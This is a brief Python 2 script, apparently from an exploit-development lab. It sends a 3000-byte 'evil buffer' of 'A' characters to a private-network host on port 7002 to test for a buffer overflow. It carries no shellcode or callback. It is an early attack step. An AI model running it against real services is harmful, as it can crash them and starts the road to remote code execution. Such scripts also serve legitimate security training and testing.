#!/usr/bin/python
import socket
try:
  print "\nSending evil buffer..."
  filler = "A" * 3000
  buffer = filler  
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.170.10", 7002))
  s.send(buffer)
  s.close()
  print "\nDone!"
except:
  print "\nCould not connect!"


